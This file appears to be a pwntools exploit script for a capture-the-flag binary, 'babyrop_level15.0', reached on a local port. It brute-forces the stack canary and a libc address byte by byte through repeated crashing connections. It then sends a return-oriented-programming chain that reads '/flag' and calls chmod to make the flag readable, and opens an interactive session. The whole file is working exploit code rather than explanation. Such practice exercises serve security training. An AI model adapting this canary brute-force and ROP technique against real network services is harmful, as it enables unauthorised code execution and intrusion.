from pwn import *
import os
first_pid = os.popen('pidof /challenge/babyrop_level15.0').read().strip()


def kill_dup_ps(id):
    l = os.popen('pidof /challenge/babyrop_level15.0').read().strip().split(' ')
    if len(l) == 1 :
        return
    
    for i in range(len(l)) :
        if l[i] != id:
            os.system(f'kill {l[i]}')


canary = b'\x00'
### leak canary 
for i in range(7):
    guess = 1

    while True:
        b_guess = int.to_bytes(guess,1,'little')
        r = remote('0.0.0.0','1337')
        r.send(b'a'*0x28+canary+b_guess)
        r.recvuntil(b'Leaving!\n')
        a = r.recv(timeout=0.5)
        
        if b'smashing' not in a :
            canary += b_guess
            print(canary)
            r.close()
            break

        guess += 1 
        r.close()

canary = u64(canary)

guess = 0x00
pie = b'\x00'
for i in range(16):
    try :
        r = remote('0.0.0.0','1337')
        r.send(b'a'*0x28 + p64(canary) + p64(0)+ pie + int.to_bytes(guess,1,'little'))
        r.recvuntil(b'Goodbye!\n')
        a = r.recv(timeout=0.2)
        if b'Welcome' not in a:
            raise error      
    ## guess to challenge address
        pie += int.to_bytes(guess,1,'little')
        print(hex(guess))
        r.close()
        kill_dup_ps(first_pid)
        break
    except:
        guess += 0x10
        r.close()
        continue

for i in range(4):
    guess = 0x00
    while True:
        try :
            r = remote('0.0.0.0','1337')
            r.send(b'a'*0x28+p64(canary) + p64(0)+ pie + int.to_bytes(guess,1,'little'))
            r.recvuntil(b'Goodbye!\n')
            a = r.recv(timeout=0.2)
            if b'Welcome' not in a:
                raise error   

            pie += int.to_bytes(guess,1,'little')
            print(pie)
            r.close()
            kill_dup_ps(first_pid)
            break

        except:
            if guess == 0xff:
                print(f'program error')
                exit()   
            guess += 0x01
            r.close()
            continue

libc = u64(pie+b'\x00\x00')-0x27000
print(f'libc base : {hex(libc)}')


## orw
pop_rdi = libc + 0x26b72
pop_rsi = libc + 0x27529
pop_rdx_r12 = libc + 0x11c371
pop_rax = libc + 0x4a550
syscall = libc + 0x66229
buffer = libc + 0x1eb100


r = remote('0.0.0.0','1337')
payload = b'a'*0x28 + p64(canary) + p64(0)
payload += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(0)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx_r12) + p64(0x20) + p64(0) + p64(syscall)
payload += p64(pop_rax) + p64(90) + p64(pop_rdi) + p64(buffer) + p64(pop_rsi) + p64(511) + p64(syscall)

r.send(payload)
r.send('/flag\x00\x00')
r.interactive()